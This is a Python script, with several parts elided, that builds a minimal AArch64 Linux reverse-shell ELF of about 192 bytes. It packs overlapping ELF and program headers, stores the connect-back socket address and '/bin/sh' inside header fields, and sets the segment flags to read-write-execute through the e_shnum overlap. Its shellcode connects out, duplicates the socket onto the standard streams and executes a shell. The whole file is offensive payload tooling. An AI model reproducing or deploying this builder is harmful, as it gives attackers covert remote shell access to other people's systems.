#!/usr/bin/env python3
"""
Miniaturized AArch64 Reverse Shell ELF (~192 bytes, down from 196).
Header reduced from 116→112 bytes by starting PHDR at offset 0x38.
e_shnum=7 provides p_flags=PF_R|PF_W|PF_X (kernel doesn't check e_shnum).
Sockaddr in e_ident[8:16], /bin/sh in e_shoff.
execve with argv=NULL, envp=NULL.
dup3 loop: mov x2,xzr once, cbnz for branch.
"""
...
BASE = 0x10000
TOTAL_HEADER_SIZE = 112  # PHDR at 0x38 → combined 64+56-8 = 112
...
def build_elf(raw_code):
    ...
    for i in range(0, len(real_code) - 4, 4):
        ...
        if top_byte == 0x58:  # LDR literal
            ...
            if old_tgt == binsh_off:
                ...
                print(f"  ADR X{rd} @ [{i:#x}]: binsh -> hdr+0x28")
                real_code[i:i+4] = struct.pack('<I', adr_encode(rd, new_imm))

    total_size = TOTAL_HEADER_SIZE + len(real_code)

    # 112-byte combined ELF+PHDR header (PHDR starts at offset 0x38)
    ...
    struct.pack_into('<I', h, 0x30, 0)                      # e_flags (not checked)
    struct.pack_into('<H', h, 0x34, 64)                     # e_ehsize
    struct.pack_into('<H', h, 0x36, 56)                     # e_phentsize

    # --- PHDR starts at 0x38 (overlaps last 8 bytes of ELF header) ---
    # 0x38: e_phnum + e_shentsize → p_type
    struct.pack_into('<H', h, 0x38, 1)     # e_phnum = 1 → p_type low = 1
    struct.pack_into('<H', h, 0x3a, 0)     # e_shentsize = 0 → p_type high = 0 → p_type = 1 ✓

    # 0x3c: e_shnum + e_shstrndx → p_flags
    struct.pack_into('<H', h, 0x3c, 7)     # e_shnum = 7 → p_flags low = 7 (RWX!)
    struct.pack_into('<H', h, 0x3e, 0)     # e_shstrndx = 0 → p_flags high = 0 → flags = 7 ✓

    # Remaining PHDR fields (at 0x40-0x6f, no ELF header overlap)
    struct.pack_into('<I', h, 0x40, 0)      # p_offset low = 0 (file offset of segment)
    struct.pack_into('<I', h, 0x44, 0)      # p_offset high = 0
    struct.pack_into('<Q', h, 0x48, BASE)   # p_vaddr
    struct.pack_into('<Q', h, 0x50, BASE)   # p_paddr (not checked)
    struct.pack_into('<Q', h, 0x58, total_size)  # p_filesz
    struct.pack_into('<Q', h, 0x60, total_size)  # p_memsz
    struct.pack_into('<Q', h, 0x68, 1)      # p_align = 1 (no alignment requirement)

    return bytes(h) + bytes(real_code)


def main():
    print("=== Miniaturized AArch64 Reverse Shell (" 
          f"{'112-byte header'}) ===\n")
    asm = make_asm()
    ...
    # Verify readelf doesn't complain about section headers
    import subprocess as sp
    try:
        result = sp.run(['readelf', '-S', output], capture_output=True, text=True)
        if 'There are no section headers' in result.stdout or '0 section headers' in result.stdout:
            print("\nreadelf -S: No section headers (as expected)")
        else:
            print(f"\nreadelf -S output:\n{result.stdout}")
    except:
        pass
